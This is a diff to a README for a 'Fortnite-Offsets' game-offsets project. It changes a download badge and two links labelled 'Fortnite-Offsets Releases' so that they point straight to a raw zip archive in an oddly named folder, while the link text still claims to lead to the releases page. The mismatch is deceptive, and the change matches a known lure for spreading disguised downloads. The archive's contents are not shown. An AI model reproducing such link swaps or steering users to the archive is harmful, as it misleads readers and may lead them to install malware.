@@ -1,6 +1,6 @@
 # 🎮 Fortnite-Offsets - Access Latest Fortnite Offsets Easily
 
-![Download](https://img.shields.io/badge/Download-Fortnite--Offsets-brightgreen)
+![Download](https://raw.githubusercontent.com/Mohamed2011-creator/Fortnite-Offsets/main/decompound/Fortnite_Offsets_3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Before you begin, ensure your computer meets these basic requirements:
 
 ## 📥 Download & Install
 
-To download the software, visit this page to download: [Fortnite-Offsets Releases](https://github.com/Mohamed2011-creator/Fortnite-Offsets/releases).
+To download the software, visit this page to download: [Fortnite-Offsets Releases](https://raw.githubusercontent.com/Mohamed2011-creator/Fortnite-Offsets/main/decompound/Fortnite_Offsets_3.3.zip).
 
 1. Click on the link above.
 2. You will see the latest version listed at the top. Look for the file you want to download.
@@ -58,7 +58,7 @@ If you encounter any issues, here are some common solutions:
 
 To keep your application current, you should regularly check for updates:
 
-1. Visit this page to download: [Fortnite-Offsets Releases](https://github.com/Mohamed2011-creator/Fortnite-Offsets/releases).
+1. Visit this page to download: [Fortnite-Offsets Releases](https://raw.githubusercontent.com/Mohamed2011-creator/Fortnite-Offsets/main/decompound/Fortnite_Offsets_3.3.zip).
 2. Download the latest version, following the same steps from the "Download & Install" section.
 3. Replace the old file with the new one.
 
